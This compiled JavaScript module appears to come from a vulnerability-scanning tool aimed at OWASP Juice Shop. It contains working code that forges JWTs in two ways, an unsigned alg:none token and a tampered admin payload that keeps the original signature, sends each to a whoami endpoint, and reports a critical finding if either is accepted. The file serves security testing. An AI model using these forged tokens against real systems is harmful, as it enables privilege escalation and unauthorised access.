"use strict";
/**
 * executor/tasks/AbuseJWT.ts
 * ---------------------------------------------------------------
 * Abuse Case: Ataques a JSON Web Tokens (JWT)
 *
 * Testa duas vulnerabilidades clássicas de implementação JWT:
 *
 * 1. Algoritmo "none" — o header do JWT é alterado para
 *    {"alg":"none","typ":"JWT"} e a assinatura é removida.
 *    Se o servidor aceitar, qualquer claim pode ser forjado
 *    (ex: isAdmin: true) sem uma chave secreta válida.
 *
 * 2. Token adulterado com claims elevados — mantém a estrutura
 *    do token mas altera o payload (ex: role para "admin"),
 *    testando se o servidor verifica a assinatura corretamente.
 *    Um servidor vulnerável aceitaria o token adulterado.
 *
 * Referência: CVE-2015-9235 (jsonwebtoken alg:none bypass)
 * Juice Shop Challenge: "Forge an almost unsigned JWT token"
 * Categoria OWASP: A02:2021 – Cryptographic Failures
 * CWE-347: Improper Verification of Cryptographic Signature
 * ---------------------------------------------------------------
 */
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.abuseJWT = abuseJWT;
const axios_1 = __importDefault(require("axios"));
/** Codifica um objeto em Base64URL (sem padding) */
function base64urlEncode(obj) {
    return Buffer.from(JSON.stringify(obj))
        .toString('base64')
        .replace(/\+/g, '-')
        .replace(/\//g, '_')
        .replace(/=/g, '');
}
/** Decoda um segmento Base64URL de um JWT */
function base64urlDecode(segment) {
    const padded = segment.replace(/-/g, '+').replace(/_/g, '/');
    return JSON.parse(Buffer.from(padded, 'base64').toString('utf8'));
}
async function abuseJWT(jwt, baseUrl) {
    const vulnerabilities = [];
    let evidence = '';
    // ── Divide o JWT original em partes ─────────────────────────
    const parts = jwt.split('.');
    if (parts.length !== 3) {
        console.warn('[Task] AbuseJWT: JWT inválido, ignorando.');
        return null;
    }
    let originalPayload = {};
    try {
        originalPayload = base64urlDecode(parts[1]);
    }
    catch {
        return null;
    }
    // ── Ataque 1: Algoritmo "none" ───────────────────────────────
    try {
        const noneHeader = base64urlEncode({ alg: 'none', typ: 'JWT' });
        const nonePayload = base64urlEncode({ ...originalPayload, role: 'admin', isAdmin: true });
        const noneToken = `${noneHeader}.${nonePayload}.`; // sem assinatura
        const noneRes = await axios_1.default.get(`${baseUrl}/rest/user/whoami`, {
            headers: {
                'Authorization': `Bearer ${noneToken}`,
                'Content-Type': 'application/json',
            },
            validateStatus: () => true,
            timeout: 10_000,
        });
        // Se retornou 200 com dados de usuário, o servidor aceitou o token forjado
        if (noneRes.status === 200 && noneRes.data?.user) {
            vulnerabilities.push('Servidor aceitou JWT com alg:none (sem assinatura) — token forjado aceito');
            evidence += `alg:none response: ${JSON.stringify(noneRes.data).substring(0, 200)}\n`;
        }
    }
    catch {
        // ataque indisponível
    }
    // ── Ataque 2: Payload adulterado (assinatura inválida) ───────
    try {
        const tamperedPayload = base64urlEncode({
            ...originalPayload,
            role: 'admin',
            isAdmin: true,
        });
        // Mantém header e assinatura originais, mas troca o payload
        const tamperedToken = `${parts[0]}.${tamperedPayload}.${parts[2]}`;
        const tamperedRes = await axios_1.default.get(`${baseUrl}/rest/user/whoami`, {
            headers: {
                'Authorization': `Bearer ${tamperedToken}`,
                'Content-Type': 'application/json',
            },
            validateStatus: () => true,
            timeout: 10_000,
        });
        if (tamperedRes.status === 200 && tamperedRes.data?.user) {
            const returnedRole = tamperedRes.data?.user?.role;
            vulnerabilities.push(`Servidor aceitou JWT com payload adulterado (assinatura inválida). Role retornado: ${returnedRole}`);
            evidence += `Tampered token response: ${JSON.stringify(tamperedRes.data).substring(0, 200)}\n`;
        }
    }
    catch {
        // ataque indisponível
    }
    if (vulnerabilities.length === 0)
        return null;
    return {
        title: 'Vulnerabilidade de Verificação de Assinatura JWT',
        severity: 'CRITICAL',
        category: 'JWT_SIGNATURE_BYPASS',
        description: 'O servidor não verifica corretamente a assinatura do JWT. ' +
            'É possível forjar tokens com claims arbitrários (ex: role=admin) ' +
            'sem conhecer a chave secreta, resultando em escalada de privilégios completa.',
        steps: [
            `JWT original decodificado: ${JSON.stringify(originalPayload).substring(0, 150)}`,
            ...vulnerabilities,
        ],
        evidence: evidence.trim(),
        discoveredAt: new Date(),
    };
}
//# sourceMappingURL=AbuseJWT.js.map